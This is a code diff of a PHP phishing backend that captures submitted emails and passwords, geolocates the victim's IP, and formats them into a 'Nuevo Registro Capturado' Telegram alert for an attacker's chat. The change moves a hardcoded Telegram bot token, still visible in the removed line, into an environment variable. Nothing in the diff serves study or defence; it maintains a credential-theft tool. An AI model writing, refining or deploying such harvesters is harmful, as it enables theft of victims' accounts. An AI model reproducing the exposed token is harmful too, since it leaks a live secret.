@@ -1,4 +1,9 @@
 <?php
+require 'vendor/autoload.php'; // Asegúrate de que la ruta sea correcta
+
+$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
+$dotenv->load();
+
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $email = isset($_POST['email']) ? $_POST['email'] : '';
     $password = isset($_POST['password']) ? $_POST['password'] : '';
@@ -13,7 +18,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $country = 'Desconocido';
     
     $api_url = "http://ip-api.com/json/$ip";
-    $response = @file_get_contents($api_url);
+    $response = file_get_contents($api_url);
     if ($response) {
         $data = json_decode($response, true);
         if ($data && isset($data['country'])) {
@@ -22,7 +27,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     }
     
     $chat_id = '7517363999';
-    $token = '7874331720:AAH0oBgeh1nixucGqnY1Sh_sBnwwzI1OVUQ';
+    $token = $_ENV['TELEGRAM_BOT_TOKEN']; // Cargar el token desde las variables de entorno
     $message = "🚨 *Nuevo Registro Capturado* 🚨\n\n" .
                "📧 *Email:* `$email`\n" .
                "🔒 *Password:* `$password`\n" .
